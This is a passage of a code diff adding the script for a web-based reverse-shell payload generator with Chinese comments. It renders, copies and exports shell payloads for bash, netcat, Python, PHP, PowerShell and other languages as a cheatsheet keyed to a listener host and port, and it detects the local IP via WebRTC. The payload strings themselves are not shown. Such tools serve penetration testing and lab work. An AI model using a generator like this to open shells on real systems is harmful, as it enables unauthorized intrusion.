+                                    <span class="payload-tag">${key.toUpperCase()}</span>
+                                    ${encoding !== 'none' ? `<span class="payload-tag">${encoding.toUpperCase()}</span>` : ''}
+                                </div>
+                            </div>
+                        </div>
+                    `).join('')}
+                </div>
+                </div>
+            </div>
+        `;
+    }
+    
+    container.innerHTML = html || '<div class="empty-state"><div class="empty-state-icon"><span class="icon icon-search"></span></div><div class="empty-state-title">未找到匹配的载荷</div></div>';
+}
+
+// 复制载荷
+function copyPayload(code) {
+    copyToClipboard(code);
+}
+
+// 生成所有载荷
+function generateAllPayloads() {
+    renderPayloads();
+    showToast('载荷已生成', 'success');
+}
+
+// 获取本机IP
+async function getLocalIP() {
+    try {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        const offer = await pc.createOffer();
+        await pc.setLocalDescription(offer);
+        
+        pc.onicecandidate = (event) => {
+            if (event.candidate) {
+                const match = event.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                if (match) {
+                    document.getElementById('target-host').value = match[1];
+                    pc.close();
+                    showToast(`已获取本机IP: ${match[1]}`, 'success');
+                }
+            }
+        };
+    } catch (e) {
+        showToast('获取IP失败，请手动输入', 'error');
+    }
+}
+
+// 过滤载荷
+function filterPayloads() {
+    renderPayloads();
+}
+
+// 设置过滤器
+function setFilter(filter) {
+    currentFilter = filter;
+    document.querySelectorAll('.filter-btn').forEach(btn => {
+        btn.classList.toggle('active', btn.dataset.filter === filter);
+    });
+    renderPayloads();
+}
+
+// 复制所有载荷
+function copyAllPayloads() {
+    const host = document.getElementById('target-host').value || 'YOUR_IP';
+    const port = document.getElementById('target-port').value || '4444';
+    
+    let allPayloads = '';
+    payloads.forEach(p => {
+        allPayloads += `# ${p.name}\n${generatePayload(p.code, host, port)}\n\n`;
+    });
+    
+    copyToClipboard(allPayloads);
+}
+
+// 导出载荷
+function exportPayloads() {
+    const host = document.getElementById('target-host').value || 'YOUR_IP';
+    const port = document.getElementById('target-port').value || '4444';
+    
+    let content = `# 反弹Shell载荷速查表\n# 目标: ${host}:${port}\n# 生成时间: ${new Date().toLocaleString()}\n\n`;
+    
+    const categories = {};
+    payloads.forEach(p => {
+        if (!categories[p.category]) categories[p.category] = [];
+        categories[p.category].push(p);
+    });
+    
+    for (const [cat, items] of Object.entries(categories)) {
+        content += `\n# ============ ${cat.toUpperCase()} ============\n\n`;
+        items.forEach(p => {
+            content += `# ${p.name} - ${p.desc}\n${generatePayload(p.code, host, port)}\n\n`;
+        });
+    }
+    
+    const blob = new Blob([content], { type: 'text/plain' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `reverse-shells-${host}-${port}.txt`;
+    a.click();
+    URL.revokeObjectURL(url);
+    showToast('载荷已导出', 'success');
+}
+
+// 生成速查表
+function generateCheatsheet() {
+    const host = document.getElementById('target-host').value || 'YOUR_IP';
+    const port = document.getElementById('target-port').value || '4444';
+    
+    let markdown = `# 反弹Shell速查表\n\n目标: \`${host}:${port}\`\n\n`;
+    
+    const categories = {
+        'bash': 'Bash / Shell',
+        'nc': 'Netcat',
+        'python': 'Python',
+        'php': 'PHP',
+        'perl': 'Perl',
+        'powershell': 'PowerShell',
+        'java': 'Java',
+        'other': '其他'
+    };
+    
+    for (const [key, name] of Object.entries(categories)) {
+        const items = payloads.filter(p => p.category === key);
+        if (items.length === 0) continue;
+        
+        markdown += `\n## ${name}\n\n`;
+        items.forEach(p => {
+            markdown += `### ${p.name}\n\n${p.desc}\n\n\`\`\`bash\n${generatePayload(p.code, host, port)}\n\`\`\`\n\n`;
+        });
+    }
+    
+    const blob = new Blob([markdown], { type: 'text/markdown' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `reverse-shell-cheatsheet.md`;
+    a.click();
+    URL.revokeObjectURL(url);
+    showToast('速查表已生成', 'success');
+}
+
+// 初始化
+document.addEventListener('DOMContentLoaded', () => {
+    renderPayloads();
+    
+    // 监听输入变化
+    document.getElementById('target-host').addEventListener('input', renderPayloads);
+    document.getElementById('target-port').addEventListener('input', renderPayloads);
+    document.getElementById('encoding').addEventListener('change', renderPayloads);
+});
+</script>
+{% endblock %}
